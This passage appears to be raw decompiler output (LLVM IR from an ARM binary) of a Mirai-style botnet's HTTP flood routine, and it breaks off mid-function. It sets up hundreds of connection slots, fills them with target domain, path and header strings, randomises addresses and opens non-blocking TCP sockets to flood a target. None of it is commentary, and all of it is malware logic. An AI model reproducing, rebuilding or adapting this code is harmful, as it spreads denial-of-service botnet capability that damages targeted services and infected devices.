  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_8314, %bb171
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb171 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb171 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb173 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @table_unlock_val(i32 45)
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @table_unlock_val(i32 46)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @table_unlock_val(i32 47)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @table_unlock_val(i32 48)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @table_unlock_val(i32 49)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @table_unlock_val(i32 50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @table_unlock_val(i32 51)
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @table_unlock_val(i32 52)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 511
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 512
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 512
  br i1 %v5_8394, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8340
  store i32 512, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb175
  %v0_839c = phi i32 [ 512, %bb175 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @table_unlock_val(i32 53)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @calloc(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_839c, 1
  br i1 %tmp176, label %dec_label_pc_84fc, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e44, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e60, %dec_label_pc_9e44 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_83e4 = udiv i32 %v0_83e0, %v1_83e4
  %v3_83e4 = urem i32 %v0_83e0, %v1_83e4
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %v3_83e4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v3_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v3_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @util_strcpy(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @util_strlen(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @memmove(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* @sb, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @util_strcpy(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* @sb, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @util_strcpy(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* @sl, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @util_strcpy(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c0, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @rand_next()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8484 = and i32 %v0_8484, 16711680
  store i32 %v1_8484, i32* %r1.global-to-local, align 4
  %v3_8488 = udiv i32 %v0_8484, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_848c = udiv i32 %v1_8484, 256
  %v5_848c = or i32 %v4_848c, %v3_8488
  store i32 %v5_848c, i32* %r2.global-to-local, align 4
  %v1_8490 = and i32 %v0_8484, 65280
  store i32 %v1_8490, i32* %r3.global-to-local, align 4
  %v0_8494 = load i32, i32* @r6, align 4
  %v1_8494 = add i32 %v0_8494, 20
  %v2_8494 = inttoptr i32 %v1_8494 to i8*
  %v3_8494 = load i8, i8* %v2_8494, align 1
  %v4_8494 = zext i8 %v3_8494 to i32
  %v5_849c = call i32 @llvm.bswap.i32(i32 %v0_8484)
  %v7_84a0 = lshr i32 %v0_8480, %v4_8494
  %v8_84a0 = add i32 %v7_84a0, %v5_849c
  store i32 %v8_84a0, i32* %r2.global-to-local, align 4
  %v1_84a4 = and i32 %v8_84a0, 16711680
  store i32 %v1_84a4, i32* %r0.global-to-local, align 4
  %v1_84b0 = and i32 %v8_84a0, 65280
  store i32 %v1_84b0, i32* %r1.global-to-local, align 4
  %v2_84b8 = and i32 %v8_84a0, 256
  %v3_84b8 = icmp ne i32 %v2_84b8, 0
  store i1 %v3_84b8, i1* %cpsr_c.global-to-local, align 1
  %v5_84b8 = call i32 @llvm.bswap.i32(i32 %v8_84a0)
  store i32 %v5_84b8, i32* %r3.global-to-local, align 4
  %v1_84bc = load i32, i32* @r5, align 4
  %v2_84bc = add i32 %v1_84bc, 16
  %v3_84bc = inttoptr i32 %v2_84bc to i32*
  store i32 %v5_84b8, i32* %v3_84bc, align 4
  br label %dec_label_pc_84c0

dec_label_pc_84c0:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c0 = call i32 @rand_next()
  %v3_84cc = udiv i32 %v0_84c0, 5
  store i32 %v3_84cc, i32* %r2.global-to-local, align 4
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v2_84d8 = sub i32 %v0_84c0, %v3_84cc
  store i32 %v2_84d8, i32* %r0.global-to-local, align 4
  %v7_84dc = icmp eq i32 %v2_84d8, 4
  store i1 %v7_84dc, i1* %cpsr_z.global-to-local, align 1
  %v5_84e0 = and i32 %v2_84d8, 1073741824
  %v6_84e0 = icmp ne i32 %v5_84e0, 0
  store i1 %v6_84e0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d8, label %dec_label_pc_9e44 [
    i32 0, label %dec_label_pc_9f08
    i32 1, label %dec_label_pc_9edc
    i32 2, label %dec_label_pc_9f34
    i32 3, label %dec_label_pc_9e1c
    i32 4, label %dec_label_pc_9e9c
  ]

dec_label_pc_84fc:                                ; preds = %thread-pre-split
  %v0_850c = load i32, i32* @r7, align 4
  %v1_850c = and i32 %v0_850c, 128
  %v2_850c = icmp ne i32 %v1_850c, 0
  store i1 %v2_850c, i1* %cpsr_c.global-to-local, align 1
  %v3_850c = udiv i32 %v0_850c, 256
  store i32 %v3_850c, i32* %r3.global-to-local, align 4
  %v1_8510 = add i32 %v2_83b0, 1452
  store i32 %v1_8510, i32* %r1.global-to-local, align 4
  %v2_8514 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_8514, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_852c.preheader:                      ; preds = %dec_label_pc_84fc, %dec_label_pc_9e68
  %v0_9e78.sink = phi i32 [ %v0_9e78, %dec_label_pc_9e68 ], [ %v0_850c, %dec_label_pc_84fc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e78, %dec_label_pc_9e68 ], [ %v3_850c, %dec_label_pc_84fc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e80, %dec_label_pc_9e68 ], [ %v2_8514, %dec_label_pc_84fc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e7c, %dec_label_pc_9e68 ], [ %v1_8510, %dec_label_pc_84fc ]
  %v1_9e84 = urem i32 %v0_9e78.sink, 256
  store i32 %v1_9e84, i32* @r7, align 4
  %v2_8694 = ptrtoint i32* %stack_var_-152 to i32
  %v2_86ac = ptrtoint i32* %stack_var_-44 to i32
  %v2_86f4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8710 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88f0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c4c = icmp eq i32 %v6_81fc, 0
  %v1_8b48 = inttoptr i32 %v6_81fc to i8*
  %v2_8778 = ptrtoint i32* %stack_var_-60 to i32
  %v2_877c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8780 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8860 = ptrtoint i32* %stack_var_-48 to i32
  %v2_886c = ptrtoint i32* %stack_var_-52 to i32
  %v4_86cc = mul nuw nsw i32 %v1_9e84, 256
  %v5_86cc = or i32 %v4_86cc, %stack_var_-20864.0.ph
  br label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %dec_label_pc_8758, %dec_label_pc_858c, %dec_label_pc_8750, %dec_label_pc_87ec, %dec_label_pc_852c.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8530 = call i32 @__GI_time(i32* null)
  store i32 %v2_8530, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_855c225 = load i32, i32* @sp, align 4
  %v3_855c226 = add i32 %v2_855c225, 20688
  %v4_855c227 = inttoptr i32 %v3_855c226 to i32*
  store i32 0, i32* %v4_855c227, align 4
  br label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8548.dec_label_pc_8548_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  %v0_8548.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_854c = add i32 %v0_8548.pre, 4
  store i32 %v1_854c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8554 = add i32 %v0_8548.pre, 20684
  store i32 %v1_8554, i32* @lr, align 4
  %v7_8558 = icmp eq i32 %v1_854c, 128
  %v2_855c = load i32, i32* @sp, align 4
  %v3_855c = add i32 %v2_855c, %v1_8554
  %v4_855c = inttoptr i32 %v3_855c to i32*
  store i32 0, i32* %v4_855c, align 4
  br i1 %v7_8558, label %dec_label_pc_8564, label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8564:                                ; preds = %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* @r1, align 4
  %v0_8568 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8568, i32* %stack_var_-332, align 4
  %v0_856c = load i32, i32* %r3.global-to-local, align 4
  %v1_8574228 = add i32 %v0_856c, -120
  store i32 %v1_8574228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c229 = add i32 %v0_856c, 20432
  store i32 %v1_857c229, i32* %r2.global-to-local, align 4
  %v7_8580230 = icmp eq i32 %v1_8574228, 128
  %v2_8584231 = load i32, i32* @sp, align 4
  %v3_8584232 = add i32 %v2_8584231, %v1_857c229
  %v4_8584233 = inttoptr i32 %v3_8584232 to i32*
  store i32 0, i32* %v4_8584233, align 4
  br i1 %v7_8580230, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_8570.dec_label_pc_8570_crit_edge:    ; preds = %dec_label_pc_8564, %dec_label_pc_8570.dec_label_pc_8570_crit_edge
  %v0_8570.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8574 = add i32 %v0_8570.pre, 4
  store i32 %v1_8574, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c = add i32 %v0_8570.pre, 20556
  store i32 %v1_857c, i32* %r2.global-to-local, align 4
  %v7_8580 = icmp eq i32 %v1_8574, 128
  %v2_8584 = load i32, i32* @sp, align 4
  %v3_8584 = add i32 %v2_8584, %v1_857c
  %v4_8584 = inttoptr i32 %v3_8584 to i32*
  store i32 0, i32* %v4_8584, align 4
  br i1 %v7_8580, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_858c:                                ; preds = %dec_label_pc_8570.dec_label_pc_8570_crit_edge, %dec_label_pc_8564
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8590 = load i32, i32* %r0.global-to-local, align 4
  %v3_8590 = icmp uge i32 %v0_839c, %v1_8590
  store i1 %v3_8590, i1* %cpsr_c.global-to-local, align 1
  %v9_8590 = icmp eq i32 %v0_839c, %v1_8590
  store i1 %v9_8590, i1* %cpsr_z.global-to-local, align 1
  %v7_8594 = icmp sgt i32 %v0_839c, %v1_8590
  br i1 %v7_8594, label %dec_label_pc_8598, label %dec_label_pc_852c

dec_label_pc_8598:                                ; preds = %dec_label_pc_858c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8590, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8590, i32* @r7, align 4
  br label %dec_label_pc_860c

dec_label_pc_85ac:                                ; preds = %dec_label_pc_8620
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_85ac = icmp eq i8 %v3_860c, 2
  store i1 %v7_85ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85ac, label %dec_label_pc_8cec, label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85ac
  %v2_85b4 = icmp ugt i8 %v3_860c, 3
  store i1 %v2_85b4, i1* %cpsr_c.global-to-local, align 1
  %v7_85b4 = icmp eq i8 %v3_860c, 4
  store i1 %v7_85b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b4, label %dec_label_pc_88bc, label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_85b4
  %v1_85bc = add nsw i32 %v4_860c, -6
  %v2_85bc = icmp ugt i8 %v3_860c, 5
  store i1 %v2_85bc, i1* %cpsr_c.global-to-local, align 1
  %v7_85bc = icmp eq i8 %v3_860c, 6
  store i1 %v7_85bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85bc, label %dec_label_pc_8d1c, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85bc
  %v2_85c4 = icmp ugt i8 %v3_860c, 6
  store i1 %v2_85c4, i1* %cpsr_c.global-to-local, align 1
  %v7_85c4 = icmp eq i8 %v3_860c, 7
  store i1 %v7_85c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c4, label %dec_label_pc_8f58, label %dec_label_pc_85cc

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85c4
  %v2_85cc = icmp ugt i8 %v3_860c, 9
  store i1 %v2_85cc, i1* %cpsr_c.global-to-local, align 1
  %v7_85cc = icmp eq i8 %v3_860c, 10
  store i1 %v7_85cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85cc, label %dec_label_pc_8fac, label %dec_label_pc_85d4

dec_label_pc_85d4:                                ; preds = %dec_label_pc_85cc
  %v1_85d4 = add nsw i32 %v4_860c, -11
  %v2_85d4 = icmp ugt i8 %v3_860c, 10
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v7_85d4 = icmp eq i8 %v3_860c, 11
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85d4, label %dec_label_pc_956c, label %dec_label_pc_85dc

dec_label_pc_85dc:                                ; preds = %dec_label_pc_8cec, %dec_label_pc_85d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_860c, align 1
  %v0_85e4 = load i32, i32* @r6, align 4
  %v1_85e4 = add i32 %v0_85e4, -1452
  %v2_85e4 = inttoptr i32 %v1_85e4 to i32*
  %v3_85e4 = load i32, i32* %v2_85e4, align 4
  store i32 %v3_85e4, i32* %r0.global-to-local, align 4
  %v1_85e8 = call i32 @__GI___libc_close(i32 %v3_85e4)
  store i32 %v1_85e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85f0 = load i32, i32* @r6, align 4
  %v2_85f0 = add i32 %v1_85f0, -1452
  %v3_85f0 = inttoptr i32 %v2_85f0 to i32*
  store i32 -1, i32* %v3_85f0, align 4
  br label %dec_label_pc_85f4

dec_label_pc_85f4:                                ; preds = %dec_label_pc_8fac, %dec_label_pc_8f58, %dec_label_pc_8d1c, %dec_label_pc_8628, %dec_label_pc_8718, %dec_label_pc_956c, %bb180, %dec_label_pc_85dc
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85f8 = load i32, i32* @r7, align 4
  %v1_85f8 = add i32 %v0_85f8, 1
  store i32 %v1_85f8, i32* @r7, align 4
  %v0_85fc = load i32, i32* @r6, align 4
  %v3_8600 = icmp uge i32 %v1_85f8, %v0_839c
  store i1 %v3_8600, i1* %cpsr_c.global-to-local, align 1
  %v9_8600 = icmp eq i32 %v1_85f8, %v0_839c
  store i1 %v9_8600, i1* %cpsr_z.global-to-local, align 1
  %v1_8604 = add i32 %v0_85fc, 3140
  store i32 %v1_8604, i32* @r6, align 4
  br i1 %v9_8600, label %dec_label_pc_85f4.dec_label_pc_8750_crit_edge, label %dec_label_pc_860c

dec_label_pc_85f4.dec_label_pc_8750_crit_edge:    ; preds = %dec_label_pc_85f4
  %v0_8750.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8750

dec_label_pc_860c:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4, %dec_label_pc_8598
  %v3_88b0 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8598 ], [ %v1_8604, %dec_label_pc_85f4 ], [ %v1_8748, %dec_label_pc_8738 ]
  %v1_860c = add i32 %v3_88b0, -1448
  %v2_860c = inttoptr i32 %v1_860c to i8*
  %v3_860c = load i8, i8* %v2_860c, align 1
  %v4_860c = zext i8 %v3_860c to i32
  store i32 %v4_860c, i32* @r3, align 4
  %v2_8614 = icmp ne i8 %v3_860c, 0
  store i1 %v2_8614, i1* %cpsr_c.global-to-local, align 1
  %v6_8614 = icmp eq i8 %v3_860c, 0
  %v7_8614 = icmp eq i8 %v3_860c, 1
  store i1 %v7_8614, i1* %cpsr_z.global-to-local, align 1
  %v1_8618 = add i32 %v3_88b0, -1452
  store i32 %v1_8618, i32* @r5, align 4
  br i1 %v7_8614, label %dec_label_pc_88a4, label %dec_label_pc_8620

dec_label_pc_8620:                                ; preds = %dec_label_pc_860c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_8614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8614, label %dec_label_pc_8628, label %dec_label_pc_85ac

dec_label_pc_8628:                                ; preds = %.thread19.dec_label_pc_8628_crit_edge, %dec_label_pc_8620
  %v0_8628 = phi i32 [ %v0_8628.pre, %.thread19.dec_label_pc_8628_crit_edge ], [ %v3_88b0, %dec_label_pc_8620 ]
  %v1_8628 = add i32 %v0_8628, -1452
  %v2_8628 = inttoptr i32 %v1_8628 to i32*
  %v3_8628 = load i32, i32* %v2_8628, align 4
  store i32 %v3_8628, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v2_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v2_8634, i1* %cpsr_c.global-to-local, align 1
  %v7_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v7_8634, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34380, i32* @lr, align 4
  %v1_8648 = xor i1 %v7_8634, true
  call void @__pseudo_cond_branch(i1 %v1_8648, i32 ptrtoint (i32* @global_var_15730.34 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v0_8654 = load i32, i32* @r5, align 4
  store i32 %v0_8654, i32* %r2.global-to-local, align 4
  %v3_8658 = call i32 @socket(i32 2, i32 1, i32 %v0_8654)
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v2_865c = icmp eq i32 %v3_8658, -1
  store i1 %v2_865c, i1* %cpsr_c.global-to-local, align 1
  %v7_865c = icmp eq i32 %v3_8658, -1
  store i1 %v7_865c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8658, i32* @r4, align 4
  %v1_8664 = load i32, i32* @r6, align 4
  %v2_8664 = add i32 %v1_8664, -1452
  %v3_8664 = inttoptr i32 %v2_8664 to i32*
  store i32 %v3_8658, i32* %v3_8664, align 4
  br i1 %v7_865c, label %dec_label_pc_85f4, label %dec_label_pc_866c

dec_label_pc_866c:                                ; preds = %dec_label_pc_8628
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8670 = load i32, i32* @r5, align 4
  store i32 %v0_8670, i32* @r2, align 4
  %v2_8674 = call i32 @__libc_fcntl(i32 %v3_8658, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_867c = or i32 %v2_8674, 2048
  store i32 %v1_867c, i32* @r2, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  store i32 %v0_8680, i32* %r0.global-to-local, align 4
  %v2_8684 = call i32 @__libc_fcntl(i32 %v0_8680, i32 4)
  store i32 %v2_8684, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %ip.global-to-local, align 4
  store i32 %v2_8694, i32* %r3.global-to-local, align 4
  %v0_8698 = load i32, i32* @r6, align 4
  %v1_8698 = add i32 %v0_8698, -1452
  %v2_8698 = inttoptr i32 %v1_8698 to i32*
  %v3_8698 = load i32, i32* %v2_8698, align 4
  store i32 %v3_8698, i32* %r0.global-to-local, align 4
  %v0_869c = load i32, i32* @r5, align 4
  store i32 %v0_869c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86ac, i32* %r3.global-to-local, align 4
